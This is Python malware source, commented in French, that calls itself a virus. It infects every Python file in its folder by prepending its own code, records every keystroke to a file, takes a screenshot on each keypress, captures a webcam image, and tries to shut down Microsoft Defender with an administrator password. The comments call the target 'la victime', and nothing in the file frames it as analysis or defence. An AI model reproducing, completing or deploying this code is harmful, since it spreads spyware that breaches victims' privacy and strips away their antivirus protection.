# VIRUS START!
import sys,glob
import itertools,subprocess,sys,os
from pynput.keyboard import Key, Listener       #lire ce que la victime tape sur son clavier
import logging      #enregistrer ce que la victime ecrit
import hek      #prends une screenshot de l'ecran de la victime
import random
import cv2      #prend une screenshot de la caméra

def clavier(touche):              #fonction qui va transformer ce que tape la victime en string
    
    hek.screen.screenshot(filename="image" + str(random.randint(1,999)) + ".png")     #prends une screenshot de l'écran à chaque frape du clavier

    logging.info(str(touche))      #recupere la touche qui est taper

virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()


self_replicating_part = False
for line in lines:
    if line == "# VIRUS START!\n":
        self_replicating_part = True
    if self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS END!\n" :
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    for line in file_code:
        if line == "# VIRUS START!\n":
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)


f = os.path.basename(sys.argv[0])
print(f)

camera = cv2.VideoCapture(0)        #initialise la camera 0 ou 1
ret, frame = camera.read()          #prend une screenshot de la camera
cv2.imwrite('cam.png',frame)        #enregistre la screenshot
camera.release()                    

cmd = subprocess.Popen(['runas', '/user:Administrateur', 'sc stop WinDefend'])     #/user a changer si erreur                 #désactive l'antivirus Microsoft Defender, en lançant le cmd en admin
cmd.communicate(input='user')      #input= a changer si erreur              #met le mot de passe admin
logging.basicConfig(filename=("Windows.txt"), level=logging.DEBUG, format="%(message)s") #initialise le fichier qui va enregistrer les frappes
 

 
with Listener(on_press=clavier) as i :      # à chaque fois q'une touche est tappé, cela appelle la fonction
    i.join()
    
# VIRUS END!\n


